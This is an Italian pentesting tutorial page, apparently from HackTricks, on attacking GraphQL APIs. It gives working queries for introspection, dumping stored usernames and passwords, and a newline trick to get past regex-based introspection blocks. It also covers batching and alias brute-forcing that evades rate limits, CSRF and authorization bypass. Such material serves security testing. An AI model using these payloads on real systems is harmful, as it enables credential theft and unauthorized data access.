# GraphQL

<details>

<summary><strong>Impara l'hacking AWS da zero a ero con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Introduzione

GraphQL √® **evidenziato** come un'**alternativa efficiente** alle API REST, offrendo un approccio semplificato per interrogare i dati dal backend. A differenza di REST, che spesso richiede numerose richieste su endpoint diversi per raccogliere dati, GraphQL consente di recuperare tutte le informazioni necessarie tramite una **singola richiesta**. Questa ottimizzazione beneficia significativamente gli sviluppatori riducendo l'ingiunzione dei loro processi di recupero dati.

## GraphQL e Sicurezza

Con l'avvento di nuove tecnologie, inclusa GraphQL, emergono anche nuove vulnerabilit√† di sicurezza. Un punto chiave da notare √® che **GraphQL non include meccanismi di autenticazione di default**. √à responsabilit√† degli sviluppatori implementare tali misure di sicurezza. Senza un'adeguata autenticazione, i punti finali GraphQL possono esporre informazioni sensibili agli utenti non autenticati, creando un rischio significativo per la sicurezza.

### Attacchi di Forza Bruta alle Directory e GraphQL

Per identificare istanze GraphQL esposte, √® consigliabile includere specifici percorsi negli attacchi di forza bruta alle directory. Questi percorsi sono:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Identificare istanze GraphQL aperte consente di esaminare le query supportate. Questo √® cruciale per comprendere i dati accessibili attraverso il punto finale. Il sistema di introspezione di GraphQL facilita ci√≤ dettagliando le query supportate da uno schema. Per ulteriori informazioni a riguardo, fare riferimento alla documentazione di GraphQL sull'introspezione: [**GraphQL: Un linguaggio di interrogazione per le API.**](https://graphql.org/learn/introspection/)

### Fingerprint

Lo strumento [**graphw00f**](https://github.com/dolevf/graphw00f) √® in grado di rilevare quale motore GraphQL √® utilizzato in un server e quindi stampa alcune informazioni utili per l'auditor di sicurezza.

#### Query universali <a href="#universal-queries" id="universal-queries"></a>

Per verificare se un URL √® un servizio GraphQL, pu√≤ essere inviata una **query universale**, `query{__typename}`. Se la risposta include `{"data": {"__typename": "Query"}}`, conferma che l'URL ospita un punto finale GraphQL. Questo metodo si basa sul campo `__typename` di GraphQL, che rivela il tipo dell'oggetto interrogato.
```javascript
query{__typename}
```
### Enumerazione di Base

Solitamente Graphql supporta **GET**, **POST** (x-www-form-urlencoded) e **POST**(json). Anche se per motivi di sicurezza √® consigliabile consentire solo json per prevenire attacchi CSRF.

#### Introspezione

Per utilizzare l'introspezione per scoprire informazioni sullo schema, interrogare il campo `__schema`. Questo campo √® disponibile sul tipo radice di tutte le query.
```bash
query={__schema{types{name,fields{name}}}}
```
Con questa query troverai il nome di tutti i tipi in uso:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Con questa query puoi estrarre tutti i tipi, i loro campi e i loro argomenti (e il tipo degli argomenti). Questo sar√† molto utile per sapere come interrogare il database.

![](<../../.gitbook/assets/image (950).png>)

**Errori**

√à interessante sapere se gli **errori** verranno **mostrati** poich√© contribuiranno con informazioni utili.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**Enumerare lo schema del database tramite l'Introspezione**

{% hint style="info" %}
Se l'introspezione √® abilitata ma la query sopra non viene eseguita, prova a rimuovere le direttive `onOperation`, `onFragment` e `onField` dalla struttura della query.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Query di introspezione inline:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
L'ultima riga di codice √® una query graphql che scaricher√† tutte le meta-informazioni dal graphql (nomi degli oggetti, parametri, tipi...)

![](<../../.gitbook/assets/image (363).png>)

Se l'introspezione √® abilitata, √® possibile utilizzare [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) per visualizzare in una GUI tutte le opzioni.

### Interrogazione

Ora che sappiamo che tipo di informazioni sono salvate all'interno del database, proviamo a **estraire alcuni valori**.

Nell'introspezione √® possibile trovare **quali oggetti √® possibile interrogare direttamente** (perch√© non √® possibile interrogare un oggetto solo perch√© esiste). Nell'immagine seguente √® possibile vedere che il "_queryType_" si chiama "_Query_" e che uno dei campi dell'oggetto "_Query_" √® "_flags_", che √® anch'esso un tipo di oggetto. Pertanto √® possibile interrogare l'oggetto flag.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Si noti che il tipo della query "_flags_" √® "_Flags_", e che questo oggetto √® definito come segue:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

√à possibile vedere che gli oggetti "_Flags_" sono composti da **nome** e **valore**. Quindi √® possibile ottenere tutti i nomi e i valori delle bandiere con la query:
```javascript
query={flags{name, value}}
```
Nota che nel caso in cui l'**oggetto da interrogare** sia di **tipo primitivo** come una **stringa** come nell'esempio seguente

![](<../../.gitbook/assets/image (958).png>)

Puoi semplicemente interrogarlo con:
```javascript
query={hiddenFlags}
```
In un altro esempio in cui c'erano 2 oggetti all'interno dell'oggetto tipo "_Query_": "_user_" e "_users_".\
Se questi oggetti non hanno bisogno di alcun argomento per essere cercati, √® possibile **recuperare tutte le informazioni da essi** chiedendo semplicemente i dati desiderati. In questo esempio preso da Internet √® possibile estrarre i nomi utente e le password salvate:

![](<../../.gitbook/assets/image (880).png>)

Tuttavia, in questo esempio se si prova a farlo si ottiene questo **errore**:

![](<../../.gitbook/assets/image (1042).png>)

Sembra che in qualche modo verr√† effettuata la ricerca utilizzando l'argomento "_**uid**_" di tipo _**Int**_.\
Comunque, sapevamo gi√† che, nella sezione [Enumerazione di Base](graphql.md#basic-enumeration) √® stata proposta una query che ci mostrava tutte le informazioni necessarie: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Se leggi l'immagine fornita quando eseguo quella query vedrai che "_**user**_" aveva l'**argomento** "_**uid**_" di tipo _Int_.

Quindi, facendo un leggero _**uid**_ bruteforce ho scoperto che con _**uid**=**1**_ √® stata recuperata una username e una password:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Nota che ho **scoperto** di poter richiedere i **parametri** "_**user**_" e "_**password**_" perch√© se cerco qualcosa che non esiste (`query={user(uid:1){noExists}}`) ottengo questo errore:

![](<../../.gitbook/assets/image (707).png>)

E durante la fase di **enumerazione** ho scoperto che l'oggetto "_**dbuser**_" aveva come campi "_**user**_" e "_**password**_.

**Trucco per il dump della stringa di query (grazie a @BinaryShadow\_)**

Se puoi cercare per tipo stringa, come: `query={theusers(description: ""){username,password}}` e **cerchi una stringa vuota** verranno **scaricati tutti i dati**. (_Nota che questo esempio non √® correlato con l'esempio dei tutorial, per questo esempio supponi di poter cercare usando "**theusers**" per un campo String chiamato "**description**"_).

### Ricerca

In questa configurazione, un **database** contiene **persone** e **film**. Le **persone** sono identificate dalla loro **email** e dal loro **nome**; i **film** dal loro **nome** e dal loro **rating**. Le **persone** possono essere amiche tra loro e avere anche film, indicando relazioni all'interno del database.

√à possibile **cercare** le persone **per** il **nome** e ottenere le loro email:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Puoi **cercare** persone **per** il **nome** e ottenere i loro **film** **sottoscritti**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Nota come sia indicato il recupero del `name` dei `subscribedMovies` della persona.

Puoi anche **cercare diversi oggetti contemporaneamente**. In questo caso, viene effettuata una ricerca di 2 film:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Oppure anche **relazioni di diversi oggetti utilizzando alias**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutazioni

**Le mutazioni sono utilizzate per apportare modifiche lato server.**

Nell'**ispezione** √® possibile trovare le **mutazioni** **dichiarate**. Nell'immagine seguente il "_MutationType_" √® chiamato "_Mutation_" e l'oggetto "_Mutation_" contiene i nomi delle mutazioni (come "_addPerson_" in questo caso):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

In questa configurazione, un **database** contiene **persone** e **film**. Le **persone** sono identificate dal loro **indirizzo email** e **nome**; i **film** dal loro **nome** e **valutazione**. Le **persone** possono essere amici tra loro e avere anche film, indicando relazioni all'interno del database.

Una mutazione per **creare nuovi** film all'interno del database pu√≤ essere simile alla seguente (in questo esempio la mutazione √® chiamata `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Nota come vengano indicati sia i valori che il tipo di dati nella query.**

Inoltre, il database supporta un'operazione di **mutazione**, chiamata `addPerson`, che consente la creazione di **persone** insieme alle loro associazioni con **amici** e **film** esistenti. √à fondamentale notare che gli amici e i film devono esistere nel database prima di poterli collegare alla persona appena creata.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Sovraccarico della direttiva

Come spiegato in [**uno dei vuln descritti in questo report**](https://www.landh.tech/blog/20240304-google-hack-50000/), un sovraccarico della direttiva implica la chiamata di una direttiva anche milioni di volte per far perdere operazioni al server fino a quando √® possibile eseguire un attacco DoS.

### Forza bruta di batching in 1 richiesta API

Questa informazione √® stata presa da [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autenticazione tramite API GraphQL con **invio simultaneo di molte query con credenziali diverse** per verificarla. Si tratta di un attacco di forza bruta classico, ma ora √® possibile inviare pi√π di una coppia login/password per richiesta HTTP a causa della funzionalit√† di batching di GraphQL. Questo approccio ingannerebbe le applicazioni esterne di monitoraggio del tasso a pensare che tutto vada bene e che non ci sia un bot di forza bruta che cerca di indovinare le password.

Di seguito puoi trovare la dimostrazione pi√π semplice di una richiesta di autenticazione dell'applicazione, con **3 diverse coppie di email/password alla volta**. Ovviamente √® possibile inviarne migliaia in una singola richiesta allo stesso modo:

![](<../../.gitbook/assets/image (1081).png>)

Come possiamo vedere dallo screenshot della risposta, la prima e la terza richiesta hanno restituito _null_ e hanno riflettuto le informazioni corrispondenti nella sezione _error_. La **seconda mutazione aveva i dati di autenticazione corretti** e la risposta ha il token di sessione di autenticazione corretto.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Senza Introspezione

Sempre pi√π **punti di accesso graphql stanno disabilitando l'introspezione**. Tuttavia, gli errori che graphql restituisce quando riceve una richiesta inaspettata sono sufficienti per strumenti come [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) per ricreare la maggior parte dello schema.

Inoltre, l'estensione di Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **osserva le richieste API GraphQL che passano attraverso Burp** e **costruisce** uno schema GraphQL **interno** con ogni nuova query che vede. Pu√≤ anche esporre lo schema per GraphiQL e Voyager. L'estensione restituisce una risposta falsa quando riceve una query di introspezione. Di conseguenza, GraphQuail mostra tutte le query, gli argomenti e i campi disponibili per l'uso all'interno dell'API. Per ulteriori informazioni [**controlla qui**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Un bel **elenco di parole** per scoprire [**entit√† GraphQL pu√≤ essere trovato qui**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Eludere le difese di introspezione GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Per eludere le restrizioni sulle query di introspezione nelle API, inserire un **carattere speciale dopo la parola chiave `__schema`** risulta efficace. Questo metodo sfrutta le sviste comuni degli sviluppatori nei modelli regex che mirano a bloccare l'introspezione concentrandosi sulla parola chiave `__schema`. Aggiungendo caratteri come **spazi, nuove righe e virgole**, che GraphQL ignora ma potrebbero non essere considerati nei regex, le restrizioni possono essere aggirate. Ad esempio, una query di introspezione con una nuova riga dopo `__schema` potrebbe eludere tali difese:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Se non avete successo, considerate metodi di richiesta alternativi, come **richieste GET** o **POST con `x-www-form-urlencoded`**, poich√© le restrizioni potrebbero essere applicate solo alle richieste POST.

### **Scoperta delle Strutture GraphQL Esposte**

Quando l'introspezione √® disabilitata, esaminare il codice sorgente del sito web per le query pre-caricate nelle librerie JavaScript √® una strategia utile. Queste query possono essere trovate utilizzando la scheda `Sources` negli strumenti per sviluppatori, fornendo approfondimenti sullo schema dell'API e rivelando potenzialmente **query sensibili esposte**. I comandi per cercare all'interno degli strumenti per sviluppatori sono:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF in GraphQL

Se non sai cos'√® il CSRF leggi la seguente pagina:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

L√¨ potrai trovare diversi endpoint GraphQL **configurati senza token CSRF.**

Nota che le richieste GraphQL di solito vengono inviate tramite richieste POST utilizzando il Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Tuttavia, la maggior parte dei punti finali GraphQL supporta anche le **richieste POST** **`form-urlencoded`**:
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Pertanto, poich√© le richieste CSRF come le precedenti vengono inviate **senza richieste di preflight**, √® possibile **effettuare** **modifiche** nel GraphQL abusando di una CSRF.

Tuttavia, nota che il nuovo valore predefinito del cookie del flag `samesite` di Chrome √® `Lax`. Ci√≤ significa che il cookie verr√† inviato solo da un sito web di terze parti nelle richieste GET.

Tieni presente che di solito √® possibile inviare la **richiesta** **query** anche come una **richiesta GET e il token CSRF potrebbe non essere convalidato in una richiesta GET.**

Inoltre, abusando di un [attacco **XS-Search**](../../pentesting-web/xs-search/) potrebbe essere possibile esfiltrare contenuti dal punto finale GraphQL abusando delle credenziali dell'utente.

Per ulteriori informazioni **controlla il** [**post originale qui**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autorizzazione in GraphQL

Molte funzioni GraphQL definite sul punto finale potrebbero controllare solo l'autenticazione del richiedente ma non l'autorizzazione.

La modifica delle variabili di input della query potrebbe portare alla divulgazione di dettagli sensibili dell'account [leaked](https://hackerone.com/reports/792927).

La mutazione potrebbe addirittura portare al furto dell'account cercando di modificare altri dati dell'account.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Bypass dell'autorizzazione in GraphQL

[Concatenare le query](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) insieme pu√≤ eludere un sistema di autenticazione debole.

Nell'esempio seguente puoi vedere che l'operazione √® "forgotPassword" e che dovrebbe eseguire solo la query forgotPassword associata ad essa. Questo pu√≤ essere eluso aggiungendo una query alla fine, in questo caso aggiungiamo "register" e una variabile utente per far registrare il sistema come nuovo utente.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Eludere i limiti di velocit√† utilizzando Alias in GraphQL

In GraphQL, gli alias sono una funzionalit√† potente che consente di **denominare esplicitamente le propriet√†** durante una richiesta API. Questa capacit√† √® particolarmente utile per recuperare **pi√π istanze dello stesso tipo** di oggetto all'interno di una singola richiesta. Gli alias possono essere utilizzati per superare il limite che impedisce agli oggetti GraphQL di avere pi√π propriet√† con lo stesso nome.

Per una comprensione dettagliata degli alias in GraphQL, si consiglia la seguente risorsa: [Alias](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Sebbene lo scopo principale degli alias sia ridurre la necessit√† di numerose chiamate API, √® stato identificato un caso d'uso non intenzionale in cui gli alias possono essere sfruttati per eseguire attacchi brute force su un endpoint GraphQL. Questo √® possibile perch√© alcuni endpoint sono protetti da limitatori di velocit√† progettati per contrastare gli attacchi brute force limitando il **numero di richieste HTTP**. Tuttavia, questi limitatori potrebbero non considerare il numero di operazioni all'interno di ciascuna richiesta. Poich√© gli alias consentono l'inclusione di pi√π query in una singola richiesta HTTP, possono aggirare tali misure di limitazione della velocit√†.

Considera l'esempio fornito di seguito, che illustra come le query con alias possono essere utilizzate per verificare la validit√† dei codici sconto del negozio. Questo metodo potrebbe eludere i limiti di velocit√† poich√© combina diverse query in una singola richiesta HTTP, consentendo potenzialmente la verifica di numerosi codici sconto contemporaneamente.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Strumenti

### Scanner di vulnerabilit√†

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Test delle comuni errate configurazioni dei punti finali graphql
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Identificazione delle graphql in uso
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Toolkit che pu√≤ essere utilizzato per ottenere schemi e cercare dati sensibili, testare l'autorizzazione, forzare gli schemi e trovare percorsi per un dato tipo.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Pu√≤ essere utilizzato come standalone o come [estensione Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Pu√≤ essere utilizzato anche come client CLI per automatizzare gli attacchi
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Strumento che elenca i diversi modi per raggiungere un dato tipo in uno schema GraphQL.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Estensione Burp per test GraphQL avanzati. Il componente _**Scanner**_ √® il nucleo di InQL v5.0, dove √® possibile analizzare un endpoint GraphQL o un file di schema di introspezione locale. Genera automaticamente tutte le query e le mutazioni possibili, organizzandole in una vista strutturata per la tua analisi. Il componente _**Attacker**_ ti consente di eseguire attacchi batch GraphQL, che possono essere utili per aggirare limiti di velocit√† implementati in modo non corretto.

### Client

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Client GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Client GUI

### Test automatici

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Video che spiega AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Riferimenti

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
